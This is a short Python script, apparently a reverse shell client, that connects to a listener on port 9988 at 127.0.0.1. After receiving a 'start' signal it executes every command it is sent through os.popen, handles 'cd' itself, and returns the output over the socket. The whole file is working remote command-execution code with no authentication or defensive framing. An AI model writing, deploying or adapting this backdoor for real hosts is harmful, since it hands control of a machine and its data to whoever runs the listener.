import os
import socket
import sys

PORT = 9988

s = socket.socket()
host = '127.0.0.1'
port = PORT
s.connect((host,port))

try:
	while True:
		flag = s.recv(1024)
		if flag.decode("utf-8") == 'start':
			break
except:
	s.close()
	sys.exit()

print ()
s.send(str.encode(str(os.getcwd() + '> ')))
print (str(os.getcwd()) + '> ',end="")

try:
	while True:
		data = s.recv(1024)
		output_data = ''
		print (data.decode("utf-8"))
		if data.decode("utf-8") == 'quit':
			print ()
			break
		if data[0:2].decode("utf-8") == 'cd':
			os.chdir(data[3:].decode("utf-8"))
		else:
			if len(data)>0:
				process=os.popen(data.decode("utf-8"))
				output_bytes = process.read()
				output_data = str(output_bytes)

		s.send(str.encode(output_data + '\n' + str(os.getcwd()) + '> '))
		print (output_data)
		print (str(os.getcwd()) + '> ', end="")

except:
	print ('Error occured')
	s.close()

s.close()
sys.exit()
